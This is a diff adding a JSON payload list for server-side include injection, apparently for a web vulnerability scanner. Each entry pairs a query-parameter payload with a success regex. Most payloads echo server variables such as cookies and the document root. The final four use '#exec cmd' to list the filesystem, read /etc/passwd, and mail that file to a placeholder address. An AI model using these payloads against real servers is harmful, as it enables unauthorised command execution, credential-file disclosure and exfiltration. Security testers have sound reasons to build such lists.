@@ -1,0 +1,420 @@
+[
+  {
+    "payload_id": "OWP-242721",
+    "vulnerability_category": "Injection (SSI)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Surrogate-Control: content=\"ESI/1.0\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<!--#|date"
+    }
+  },
+  {
+    "payload_id": "OWP-242722",
+    "vulnerability_category": "Injection (SSI)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<!--#echo var=\"auth_type\" -->",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<!--#|date"
+    }
+  },
+  {
+    "payload_id": "OWP-242723",
+    "vulnerability_category": "Injection (SSI)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<!--#echo var=\"content_length\" -->",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<!--#|date"
+    }
+  },
+  {
+    "payload_id": "OWP-242724",
+    "vulnerability_category": "Injection (SSI)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<!--#echo var=\"content_type\" -->",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<!--#|date"
+    }
+  },
+  {
+    "payload_id": "OWP-242725",
+    "vulnerability_category": "Injection (SSI)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<!--#echo var=\"date_gmt\" -->",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<!--#|date"
+    }
+  },
+  {
+    "payload_id": "OWP-242726",
+    "vulnerability_category": "Injection (SSI)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<!--#echo var=\"date_local\" -->",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<!--#|date"
+    }
+  },
+  {
+    "payload_id": "OWP-242727",
+    "vulnerability_category": "Injection (SSI)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<!--#echo var=\"document_name\" -->",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<!--#|date"
+    }
+  },
+  {
+    "payload_id": "OWP-242728",
+    "vulnerability_category": "Injection (SSI)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<!--#echo var=\"document_root\" -->",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<!--#|date"
+    }
+  },
+  {
+    "payload_id": "OWP-242729",
+    "vulnerability_category": "Injection (SSI)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<!--#echo var=\"document_uri\" -->",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<!--#|date"
+    }
+  },
+  {
+    "payload_id": "OWP-242730",
+    "vulnerability_category": "Injection (SSI)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<!--#echo var=\"forwarded\" -->",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<!--#|date"
+    }
+  },
+  {
+    "payload_id": "OWP-242731",
+    "vulnerability_category": "Injection (SSI)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<!--#echo var=\"from\" -->",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<!--#|date"
+    }
+  },
+  {
+    "payload_id": "OWP-242732",
+    "vulnerability_category": "Injection (SSI)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<!--#echo var=\"gateway_interface\" -->",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<!--#|date"
+    }
+  },
+  {
+    "payload_id": "OWP-242733",
+    "vulnerability_category": "Injection (SSI)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<!--#echo var=\"http_accept\" -->",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<!--#|date"
+    }
+  },
+  {
+    "payload_id": "OWP-242734",
+    "vulnerability_category": "Injection (SSI)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<!--#echo var=\"http_accept_charset\" -->",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<!--#|date"
+    }
+  },
+  {
+    "payload_id": "OWP-242735",
+    "vulnerability_category": "Injection (SSI)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<!--#echo var=\"http_accept_encoding\" -->",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<!--#|date"
+    }
+  },
+  {
+    "payload_id": "OWP-242736",
+    "vulnerability_category": "Injection (SSI)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<!--#echo var=\"http_accept_language\" -->",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<!--#|date"
+    }
+  },
+  {
+    "payload_id": "OWP-242737",
+    "vulnerability_category": "Injection (SSI)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<!--#echo var=\"http_connection\" -->",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<!--#|date"
+    }
+  },
+  {
+    "payload_id": "OWP-242738",
+    "vulnerability_category": "Injection (SSI)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<!--#echo var=\"http_cookie\" -->",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<!--#|date"
+    }
+  },
+  {
+    "payload_id": "OWP-242739",
+    "vulnerability_category": "Injection (SSI)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<!--#echo var=\"http_host\" -->",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<!--#|date"
+    }
+  },
+  {
+    "payload_id": "OWP-242740",
+    "vulnerability_category": "Injection (SSI)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<!--#echo var=\"last_modified\" -->",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<!--#|date"
+    }
+  },
+  {
+    "payload_id": "OWP-242741",
+    "vulnerability_category": "Injection (SSI)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<!--#echo var=\"path_info\" -->",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<!--#|date"
+    }
+  },
+  {
+    "payload_id": "OWP-242742",
+    "vulnerability_category": "Injection (SSI)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<!--#echo var=\"path_translated\" -->",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<!--#|date"
+    }
+  },
+  {
+    "payload_id": "OWP-242743",
+    "vulnerability_category": "Injection (SSI)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<!--#echo var=\"query_string\" -->",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<!--#|date"
+    }
+  },
+  {
+    "payload_id": "OWP-242744",
+    "vulnerability_category": "Injection (SSI)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<!--#echo var=\"remote_addr\" -->",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<!--#|date"
+    }
+  },
+  {
+    "payload_id": "OWP-242745",
+    "vulnerability_category": "Injection (SSI)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<!--#echo var=\"remote_ident\" -->",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<!--#|date"
+    }
+  },
+  {
+    "payload_id": "OWP-242746",
+    "vulnerability_category": "Injection (SSI)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<!--#echo var=\"remote_port\" -->",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<!--#|date"
+    }
+  },
+  {
+    "payload_id": "OWP-242747",
+    "vulnerability_category": "Injection (SSI)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<!--#echo var=\"request_method\" -->",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<!--#|date"
+    }
+  },
+  {
+    "payload_id": "OWP-242748",
+    "vulnerability_category": "Injection (SSI)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<!--#echo var=\"script_filename\" -->",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<!--#|date"
+    }
+  },
+  {
+    "payload_id": "OWP-242749",
+    "vulnerability_category": "Injection (SSI)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<!--#echo var=\"script_name\" -->",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<!--#|date"
+    }
+  },
+  {
+    "payload_id": "OWP-242750",
+    "vulnerability_category": "Injection (SSI)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<!--#echo var=\"server_port\" -->",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<!--#|date"
+    }
+  },
+  {
+    "payload_id": "OWP-242751",
+    "vulnerability_category": "Injection (SSI)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<!--#echo var=\"server_protocol\" -->",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<!--#|date"
+    }
+  },
+  {
+    "payload_id": "OWP-242752",
+    "vulnerability_category": "Injection (SSI)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<!--#echo var=\"server_software\" -->",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<!--#|date"
+    }
+  },
+  {
+    "payload_id": "OWP-242753",
+    "vulnerability_category": "Injection (SSI)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<!--#echo var=\"tz\" -->",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<!--#|date"
+    }
+  },
+  {
+    "payload_id": "OWP-242754",
+    "vulnerability_category": "Injection (SSI)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<!--#echo var=\"user_name\" -->",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<!--#|date"
+    }
+  },
+  {
+    "payload_id": "OWP-399003",
+    "vulnerability_category": "Injection (SSI)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<!--#exec cmd=\"/bin/ls /\" --><br/>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<!--#|date"
+    }
+  },
+  {
+    "payload_id": "OWP-399004",
+    "vulnerability_category": "Injection (SSI)",
+    "target_technology": "Linux",
+    "injection_point": "query_parameter",
+    "payload_string": "<!--#exec cmd=\"cat /etc/passwd\" --><br/>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<!--#|date"
+    }
+  },
+  {
+    "payload_id": "OWP-399005",
+    "vulnerability_category": "Injection (SSI)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<!--#exec cmd=\"find / -name *.* -print\" --><br/>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<!--#|date"
+    }
+  },
+  {
+    "payload_id": "OWP-399006",
+    "vulnerability_category": "Injection (SSI)",
+    "target_technology": "Linux",
+    "injection_point": "query_parameter",
+    "payload_string": "<!--#exec cmd=\"mail email@dom.tld <mailto:email@dom.tld> < cat /etc/passwd\" --><br/>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<!--#|date"
+    }
+  }
+]
